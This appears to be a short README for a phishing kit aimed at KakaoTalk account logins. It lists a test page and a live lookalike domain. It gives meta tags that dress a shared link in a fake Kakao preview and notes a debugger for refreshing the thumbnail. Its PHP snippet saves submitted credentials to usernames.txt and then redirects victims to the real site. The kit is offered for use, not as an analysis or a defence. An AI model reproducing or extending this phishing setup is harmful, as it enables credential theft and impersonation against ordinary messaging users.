# Kakao login Phishing


## Service
```
#Test
https://dnldp55.github.io/
#Live
https://accountkakao.works/
```

## Fake URL Preview
```
<head>
    <meta property="og:url" content="[[카카오 썸네일 노출 링크]]">
    <meta property="og:title" content="제목">
    <meta property="og:type" content="website">
    <meta property="og:image" content="[[카카오 썸네일 노출 링크]]">
    <meta property="og:description" content="본문 내용.">
    <title>카카오톡 URL링크</title>
</head>
```
```
# 빠른 썸네일 반영
https://developers.kakao.com/tool/debugger/sharing
```
## Phishing

```
# Post.PHP
$handle=fopen("usernames.txt","a"); 입력된 계정 정보를 usernames.txt에 저장 
header("location:[[로그인 버튼 누를시 이동되는 원본 사이트 주소]]");

```
